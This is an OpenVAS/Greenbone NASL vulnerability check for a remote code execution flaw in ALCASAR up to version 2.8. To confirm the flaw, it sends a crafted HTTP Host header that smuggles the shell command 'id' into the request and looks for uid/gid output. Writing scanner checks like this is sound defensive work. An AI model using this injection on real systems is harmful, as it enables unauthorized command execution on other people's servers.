# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105082");
  script_version("2024-06-28T15:38:46+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("ALCASAR RCE Vulnerability");

  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Sep/26");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2014/Sep/46");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary commands");

  script_tag(name:"vuldetect", value:"Send a specially crafted value in the 'host' HTTP header and check the response.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of
  this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release,
  disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"summary", value:"ALCASAR is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"affected", value:"ALCASAR <= 2.8");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-09-08 11:48:21 +0200 (Mon, 08 Sep 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

vt_strings = get_vt_strings();

foreach dir( make_list_unique( "/alcasar", http_cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/index.php";
  buf = http_get_cache( item:url, port:port );

  if( "<title>ALCASAR" >!< buf ) continue;

  host = http_host_name( port:port );
  req = 'GET ' + dir + '/index.php HTTP/1.1\r\n' +
        'Host: ' + host + 'mailto:' + vt_strings["lowercase_rand"] + '@' + vt_strings["lowercase"] + '.org;id;#' +
        'Connection: close\r\n' +
        '\r\n\r\n';
  result = http_keepalive_send_recv( port:port, data:req );

  if( result =~ "uid=[0-9]+.*gid=[0-9]+" ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
